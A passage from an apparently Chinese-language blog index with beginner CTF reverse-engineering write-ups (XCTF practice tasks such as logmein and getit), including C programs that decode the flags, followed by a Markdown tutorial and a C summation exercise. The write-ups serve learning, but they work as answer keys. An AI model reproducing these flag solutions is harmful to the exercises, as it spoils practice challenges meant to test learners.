class="number">32</span>,<span class="number">12</span>,<span class="number">48</span>,<span class="number">65</span>,<span class="number">31</span>,<span class="number">78</span>,<span class="number">62</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">57</span>,<span class="number">96</span>,<span class="number">3</span>,<span class="number">21</span>,<span class="number">9</span>,<span class="number">4</span>,</span><br><span class="line">        <span class="number">62</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">44</span>,<span class="number">65</span>,<span class="number">78</span>,<span class="number">32</span>,<span class="number">16</span>,<span class="number">97</span>,<span class="number">54</span>,<span class="number">16</span>,<span class="number">44</span>,<span class="number">52</span>,<span class="number">32</span>,<span class="number">64</span>,<span class="number">89</span>,<span class="number">45</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">15</span>,<span class="number">34</span>,<span class="number">18</span>,<span class="number">16</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> b[<span class="number">56</span>] = &#123;<span class="number">123</span>,<span class="number">32</span>,<span class="number">18</span>,<span class="number">98</span>,<span class="number">119</span>,<span class="number">108</span>,<span class="number">65</span>,<span class="number">41</span>,<span class="number">124</span>,<span class="number">80</span>,<span class="number">125</span>,<span class="number">38</span>,<span class="number">124</span>,<span class="number">111</span>,<span class="number">74</span>,<span class="number">49</span>,<span class="number">83</span>,<span class="number">108</span>,<span class="number">94</span>,<span class="number">108</span>,<span class="number">84</span>,<span class="number">6</span>,</span><br><span class="line">        <span class="number">96</span>,<span class="number">83</span>,<span class="number">44</span>,<span class="number">121</span>,<span class="number">104</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">95</span>,<span class="number">117</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">123</span>,<span class="number">127</span>,<span class="number">119</span>,<span class="number">96</span>,<span class="number">48</span>,<span class="number">107</span>,<span class="number">71</span>,<span class="number">92</span>,<span class="number">29</span>,<span class="number">81</span>,<span class="number">107</span>,</span><br><span class="line">        <span class="number">90</span>,<span class="number">85</span>,<span class="number">64</span>,<span class="number">12</span>,<span class="number">43</span>,<span class="number">76</span>,<span class="number">86</span>,<span class="number">13</span>,<span class="number">114</span>,<span class="number">1</span>,<span class="number">117</span>,<span class="number">126</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=<span class="number">56</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        a[i] ^= b[i];</span><br><span class="line">            a[i] ^= <span class="number">19</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, a[i]);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果即为flag。</p><h2 id="Hello-CTF"><a href="#Hello-CTF" class="headerlink" title="Hello, CTF"></a>Hello, CTF</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5075&page=1">题目链接</a><br>查看main函数伪代码：</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/Hello,CTF_1.png"></p><p>‘v13’16进制转字符串。</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/Hello,CTF_2.png"></p><h2 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5076&page=1">题目链接</a><br>此题文件可直接放入编译器中打开。</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/open-source.png"></p><p>直接计算：51966*31337+8*11+7-1615810207=12648430<br>转16进制：c0ffee</p><h2 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5077&page=1">题目链接</a><br>查看文件</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/simple-unpack_2.png"></p><p>软件去壳，再用ida打开</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/simple-unpack_4.png"></p><h2 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5078&page=1">题目链接</a><br>ida打开，查看main函数伪代码：</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/logmein_1.png"></p><p>还原程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _BYTE unsigned char</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> v8[<span class="number">18</span>] = <span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> v7 = <span class="number">28537194573619560</span>;</span><br><span class="line"><span class="keyword">int</span> v6 = <span class="number">7</span>;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">18</span>] = <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(v8); ++i)</span><br><span class="line">&#123;</span><br><span class="line">s[i] = (<span class="keyword">char</span>)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果即为flag。</p><h2 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5082&page=1">题目链接</a><br>ida打开，查看main函数伪代码：</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/getit_1.png"></p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/getit_2.png"></p><p>还原程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v5 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> v3;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100</span>] = <span class="string">&quot;c61b68366edeb7bdce3c6820314b7498&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> t[<span class="number">100</span>] = <span class="string">&quot;SharifCTF&#123;????????????????????????????????&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span> ( v5 &lt; <span class="built_in">strlen</span>(s) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ( v5 &amp; <span class="number">1</span> )</span><br><span class="line">                 v3 = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                 v3 = <span class="number">-1</span>;</span><br><span class="line">                *(t + v5 + <span class="number">10</span>) = s[v5] + v3;</span><br><span class="line">                v5 = v5 + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, t);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果即为flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown基本语法</title>
      <link href="/2020/11/20/Markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
      <url>/2020/11/20/Markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="一、标题"><a href="#一、标题" class="headerlink" title="一、标题"></a>一、标题</h1><a id="more"></a><p>在想要设置为标题的文字前面加#来表示<br>一个#是一级标题，二个#是二级标题，以此类推。支持六级标题。</p><p>示例(实际应用中去掉前方\或丨)：<br>\1. # 这是一级标题<br>\2. ## 这是二级标题<br>\3. ### 这是三级标题<br>\4. #### 这是四级标题<br>\4. ##### 这是五级标题<br>\6. ###### 这是六级标题<br>效果：</p><h1 id="这是一级标题"><a href="#这是一级标题" class="headerlink" title="这是一级标题"></a>这是一级标题</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="这是三级标题"><a href="#这是三级标题" class="headerlink" title="这是三级标题"></a>这是三级标题</h3><h4 id="这是四级标题"><a href="#这是四级标题" class="headerlink" title="这是四级标题"></a>这是四级标题</h4><h5 id="这是五级标题"><a href="#这是五级标题" class="headerlink" title="这是五级标题"></a>这是五级标题</h5><h6 id="这是六级标题"><a href="#这是六级标题" class="headerlink" title="这是六级标题"></a>这是六级标题</h6><h1 id="二、字体"><a href="#二、字体" class="headerlink" title="二、字体"></a>二、字体</h1><p> 要加粗的文字左右分别用两个”<em>“号包起来<br> 要倾斜的文字左右分别用一个”</em>“号包起来<br> 要倾斜和加粗的文字左右分别用三个”<em>“号包起来<br> 要加删除线的文字左右分别用两个”~~”号包起来<br>示例：<br>\1. <strong>这是加粗的文字</strong><br>\2. <em>这是倾斜的文字</em><br>\3. **</em>这是斜体加粗的文字***<br>\4. <del>这是加删除线的文字</del></p><p>效果：<br><strong>这是加粗的文字</strong><br><em>这是倾斜的文字</em><br>**<em>这是斜体加粗的文字**</em><br><del>这是加删除线的文字</del></p><h1 id="三、引用"><a href="#三、引用" class="headerlink" title="三、引用"></a>三、引用</h1><p>在引用的文字前加&gt;即可。引用也可以嵌套，如加两个&gt;&gt;三个&gt;&gt;&gt;<br>n个…<br>示例：<br>\1. &gt;这是引用的内容<br>\2. &gt;&gt;这是引用的内容<br>\3. &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;这是引用的内容</p><p>效果：</p><blockquote><p>这是引用的内容</p><blockquote><p>这是引用的内容</p><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><p>这是引用的内容</p></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote><h1 id="四、分割线"><a href="#四、分割线" class="headerlink" title="四、分割线"></a>四、分割线</h1><p>三个或者三个以上的 - 或者 * 都可以。<br>示例：<br>\1. —<br>\2. —-<br>\3. <strong>*<br>\4. ***</strong></p><h2 id="效果："><a href="#效果：" class="headerlink" title="效果："></a>效果：</h2><hr><hr><hr><blockquote><p>持续更新中</p></blockquote><p><a href="https://www.jianshu.com/p/191d1e21f7ed/">文章内容来源</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前n项和</title>
      <link href="/2020/11/19/%E5%89%8Dn%E9%A1%B9%E5%92%8C/"/>
      <url>/2020/11/19/%E5%89%8Dn%E9%A1%B9%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="计算前n项和（C语言）"><a href="#计算前n项和（C语言）" class="headerlink" title="计算前n项和（C语言）"></a>计算前n项和（C语言）</h1><a id="more"></a><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; //计算1+2+3+...+n </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a, b, c, d;</span><br><span class="line">b = <span class="number">0</span>;</span><br><span class="line">c = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入1开始程序\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;d) == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入n（为数字），输出结果为：1+2+3+...+n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">    <span class="keyword">while</span> (b &lt;= a)</span><br><span class="line">        &#123;</span><br><span class="line">         c = b + c;</span><br><span class="line">         b++; </span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1+2+3+...+n = %d\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入q离开程序，或者输入1再次开始程序计算令一个1+2+3+...+n\n&quot;</span>);</span><br><span class="line">    b = <span class="number">0</span>;</span><br><span class="line">    c = <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>因本人能力限制，不会其他的函数，所以此代码比较复杂。</p></blockquote><hr><h2 id="推荐一本C语言入门书籍"><a href="#推荐一本C语言入门书籍" class="headerlink" title="推荐一本C语言入门书籍"></a>推荐一本C语言入门书籍</h2><p><img src="https://img1.doubanio.com/view/subject/l/public/s29438897.jpg" alt="C Primer Plus"><br><a href="https://item.jd.com/12627795.html">购买C Primer Plus（京东）</a></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 编程练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++-编程练习 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
